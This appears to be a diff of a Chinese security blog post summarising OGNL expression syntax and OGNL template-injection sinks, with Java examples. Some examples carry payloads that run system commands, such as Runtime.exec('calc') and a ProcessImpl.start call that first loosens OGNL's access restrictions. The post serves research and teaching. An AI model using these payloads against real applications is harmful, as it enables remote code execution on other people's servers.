-</span></span><span class="line"><span class="cl">    <span class="n">OgnlContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">rootMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;(</span><span class="n">1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rootMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span><span class="s">&#34;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.setAllowPackageProtectedAccess(true),#cmd=new String[]{&#39;calc&#39;},@java.lang.ProcessImpl@start(#cmd,null,null,null,false)&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">setRoot</span><span class="o">(</span><span class="n">rootMap</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">express</span> <span class="o">=</span> <span class="s">&#34;(test)(&#39;fuckOgnl&#39;)&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span><span class="n">context</span><span class="o">,</span> <span class="n">context</span><span class="o">.</span><span class="na">getRoot</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="参考链接">参考链接</h2>
-<ul>
-<li><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></li>
-<li><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></li>
-</ul>
-
-    </div>
-
-    <div class="post-copyright">
-  <p class="copyright-item">
-    <span class="item-title">文章作者</span>
-    <span class="item-content">P1n93r</span>
-  </p>
-  <p class="copyright-item">
-    <span class="item-title">上次更新</span>
-    <span class="item-content">
-        2021-06-15
-        
-    </span>
-  </p>
-  
-  
-</div>
-<footer class="post-footer">
-      
-      <nav class="post-nav">
-        <a class="prev" href="/post/security/mysql_jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">MySQL_JDBC反序列化</span>
-            <span class="prev-text nav-mobile">上一篇</span>
-          </a>
-        <a class="next" href="/post/security/pebble%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
-            <span class="next-text nav-default">Pebble安全研究</span>
-            <span class="next-text nav-mobile">下一篇</span>
-            <i class="iconfont icon-right"></i>
-          </a>
-      </nav>
-    </footer>
-  </article>
-        </div>
-        <div id="disqus_thread"></div>
-    <script type="text/javascript">
-    (function() {
-      
-      
-      if (window.location.hostname === 'localhost') return;
-
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      var disqus_shortname = 'p1n93r';
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-  
-
-  
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="social-links">
-      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
-      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
-  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
-</div>
-
-<div class="copyright">
-  <span class="power-by">
-    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
-  </span>
-  <span class="division">|</span>
-  <span class="theme-info">
-    主题 - 
-    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
-  </span>
-
-  <div class="busuanzi-footer">
-    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
-      <span class="division">|</span>
-    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
-  </div>
-
-  <span class="copyright-year">
-    &copy; 
-    2019 - 
-    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
-  </span>
-</div>
-
-    </footer>
-
-    <div class="back-to-top" id="back-to-top">
-      <i class="iconfont icon-up"></i>
-    </div>
-  </div>
-  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
-
-
-
-<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
-
-
-
-
-
-
-
-
-</body>
-</html>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Ognl_SSTI总结 - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.97.3 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/ognl_ssti%E6%80%BB%E7%BB%93/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
+<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Ognl_SSTI总结"><meta property="og:description" content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/ognl_ssti%E6%80%BB%E7%BB%93/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-06-15T17:07:36+08:00"><meta property="article:modified_time" content="2021-06-15T17:07:36+08:00"><meta itemprop=name content="Ognl_SSTI总结"><meta itemprop=description content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"><meta itemprop=datePublished content="2021-06-15T17:07:36+08:00"><meta itemprop=dateModified content="2021-06-15T17:07:36+08:00"><meta itemprop=wordCount content="3169"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Ognl_SSTI总结"><meta name=twitter:description content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
+<span></span>
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Ognl_SSTI总结</h1><div class=post-meta><span class=post-time>2021-06-15</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 3169 字</span>
+<span class=more-meta>预计阅读 7 分钟</span>
+<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#ognl介绍>Ognl介绍</a></li><li><a href=#ognl三要素>Ognl三要素</a></li><li><a href=#ognl基本语法>Ognl基本语法</a></li><li><a href=#ognl其他特性>Ognl其他特性</a></li><li><a href=#ognl-ssti-sink>Ognl SSTI Sink</a></li><li><a href=#参考链接>参考链接</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=ognl介绍>Ognl介绍</h2><p>Ognl，即对象视图导航语言（Object Graphic Navigation Language）。</p><p>使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，调用 Java 对象的方法，以及实现类型转换等。</p><p>OGNL 具有以下特点：</p><ul><li>支持对象方法调用。如 <code>objName.methodName()</code>。</li><li>支持类静态方法调用和值访问，表达式的格式为 <code>@[类全名（包括包路径）]@[方法名|值名]</code> 。如 <code>@java.lang.String@format('fruit%s','frt')</code> 。</li><li>支持赋值操作和表达式串联。如 <code>price=100</code> ，<code>discount=0.8</code> ，在方法 <code>calculatePrice()</code> 中进行乘法计算会返回 80。</li><li><strong>访问 OGNL 上下文（OGNL context）和 ActionContext</strong>。</li><li>操作集合对象。</li></ul><h2 id=ognl三要素>Ognl三要素</h2><p><strong>(1) 表达式</strong></p><p>表达式是整个 OGNL 的核心，OGNL 会根据表达式到对象中取值。所有 OGNL 操作都是针对表达式解析后进行的，它表明了此次 OGNL 操作要“做什么”。实际上，表达式就是一个带有语法含义的字符串，这个字符串规定了操作的类型和操作的内容。</p><p><strong>(2) 上下文对象</strong></p><p>上下文对象规定了 OGNL 操作“在哪里进行”。<code>context</code> 对象是一个 <code>Map</code> 类型的对象，在表达式中访问 <code>context</code> 中的对象，需要使用 <code>#</code> 号加对象名称，即 <code># 对象名称</code> 的形式。例如要获取 <code>context</code> 对象中 <code>user</code> 对象的 <code>username</code> 值，可以如下书写：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#user.username
+</span></span></code></pre></td></tr></table></div></div><p><strong>(3) 根对象</strong></p><p>根对象可以理解为 OGNL 的操作对象，OGNL 可以对根对象进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境。</p><h2 id=ognl基本语法>Ognl基本语法</h2><p><strong>(1) 对root对象的访问</strong></p><p>支持链式访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>user</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>user</span><span class=o>.</span><span class=na>setAge</span><span class=o>(</span><span class=n>22</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>user</span><span class=o>.</span><span class=na>setName</span><span class=o>(</span><span class=s>&#34;p1n93r&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Address</span> <span class=n>address</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Address</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>address</span><span class=o>.</span><span class=na>setProvince</span><span class=o>(</span><span class=s>&#34;湖南&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>address</span><span class=o>.</span><span class=na>setCity</span><span class=o>(</span><span class=s>&#34;常德&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>user</span><span class=o>.</span><span class=na>setAddress</span><span class=o>(</span><span class=n>address</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;name = &#34;</span><span class=o>+</span><span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=s>&#34;name&#34;</span><span class=o>,</span> <span class=n>user</span><span class=o>));</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;age = &#34;</span><span class=o>+</span><span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=s>&#34;age&#34;</span><span class=o>,</span> <span class=n>user</span><span class=o>));</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ognl支持链式调用
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;address = &#34;</span><span class=o>+</span><span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=s>&#34;address.province&#34;</span><span class=o>,</span> <span class=n>user</span><span class=o>));</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>name = p1n93r
+</span></span><span class=line><span class=cl>age = 22
+</span></span><span class=line><span class=cl>address = 湖南
+</span></span></code></pre></td></tr></table></div></div><p><strong>(2) 对上下文对象的访问</strong></p><p>向上面那样，如果不设置上下文对象，则 <code>Ognl</code> 会创建一个空的 <code>context</code> ：</p><p><img src=/media/image-20210914100428914.png alt=image-20210914100428914></p><p>现在测试设置 <code>context</code> 时，访问 <code>context</code> 对象，代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testAccessContext</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>rootUser</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>rootUser</span><span class=o>.</span><span class=na>setName</span><span class=o>(</span><span class=s>&#34;rootUser&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>contextUser</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>contextUser</span><span class=o>.</span><span class=na>setName</span><span class=o>(</span><span class=s>&#34;contextUser&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;(</span><span class=n>2</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;init&#34;</span><span class=o>,</span> <span class=s>&#34;hello&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;contextUser&#34;</span><span class=o>,</span> <span class=n>contextUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>express</span> <span class=o>=</span> <span class=s>&#34;#contextUser.name&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>express1</span> <span class=o>=</span> <span class=s>&#34;#init&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span> <span class=n>context</span><span class=o>,</span> <span class=n>rootUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>value1</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express1</span><span class=o>,</span> <span class=n>context</span><span class=o>,</span> <span class=n>rootUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express1</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value1</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#contextUser.name = contextUser
+</span></span><span class=line><span class=cl>#init = hello
+</span></span></code></pre></td></tr></table></div></div><p><em><strong>注意</strong></em> ： <code>#</code> 只支持访问 <code>context</code> 对象，不支持访问 <code>root</code> 对象；</p><p><strong>(3) 对静态成员的访问</strong></p><p>在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式为 <code>@[class]@[field/method ()]</code> 。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public static void testAccessStatic()throws Exception{
+</span></span><span class=line><span class=cl>    String[] expressions = {
+</span></span><span class=line><span class=cl>            &#34;@java.lang.System@out.println(\&#34;hello,I&#39;m an static method access test\&#34;)&#34;,
+</span></span><span class=line><span class=cl>            &#34;@java.lang.Integer@MAX_VALUE&#34;,
+</span></span><span class=line><span class=cl>            &#34;@java.lang.Runtime@getRuntime().exec(\&#34;calc\&#34;)&#34;
+</span></span><span class=line><span class=cl>    };
+</span></span><span class=line><span class=cl>    for (String express : expressions) {
+</span></span><span class=line><span class=cl>        Object value = Ognl.getValue(express, null);
+</span></span><span class=line><span class=cl>        System.out.println(express+&#34; = &#34;+value);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>输出为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hello,I&#39;m an static method access test
+</span></span><span class=line><span class=cl>@java.lang.System@out.println(&#34;hello,I&#39;m an static method access test&#34;) = null
+</span></span><span class=line><span class=cl>@java.lang.Integer@MAX_VALUE = 2147483647
+</span></span><span class=line><span class=cl>@java.lang.Runtime@getRuntime().exec(&#34;calc&#34;) = java.lang.ProcessImpl@28ba21f3
+</span></span></code></pre></td></tr></table></div></div><p><strong>(4) 方法的调用</strong></p><p>可以直接访问 <code>root</code> 对象的 <code>public</code> 方法，以及 <code>context</code> 对象的 <code>public</code> 方法。示例代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testAccessMethod</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>rootUser</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>contextUser</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;(</span><span class=n>2</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;username&#34;</span><span class=o>,</span> <span class=s>&#34;p1n93r&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;contextUser&#34;</span><span class=o>,</span> <span class=n>contextUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span><span class=o>[]</span> <span class=n>expressions</span> <span class=o>=</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;setName(#username)&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#contextUser.setName(&#39;contextUser&#39;)&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>    <span class=o>};</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;rootUser = &#34;</span><span class=o>+</span><span class=n>rootUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;contextUser = &#34;</span><span class=o>+</span><span class=n>contextUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;:::::::::::::::::::::::::::::&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=n>String</span> <span class=n>express</span> <span class=o>:</span> <span class=n>expressions</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=n>rootUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;:::::::::::::::::::::::::::::&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;rootUser = &#34;</span><span class=o>+</span><span class=n>rootUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;contextUser = &#34;</span><span class=o>+</span><span class=n>contextUser</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>rootUser = User(name=null, age=null, address=null)
+</span></span><span class=line><span class=cl>contextUser = User(name=null, age=null, address=null)
+</span></span><span class=line><span class=cl>:::::::::::::::::::::::::::::
+</span></span><span class=line><span class=cl>setName(#username) = null
+</span></span><span class=line><span class=cl>#contextUser.setName(&#39;contextUser&#39;) = null
+</span></span><span class=line><span class=cl>:::::::::::::::::::::::::::::
+</span></span><span class=line><span class=cl>rootUser = User(name=p1n93r, age=null, address=null)
+</span></span><span class=line><span class=cl>contextUser = User(name=contextUser, age=null, address=null)
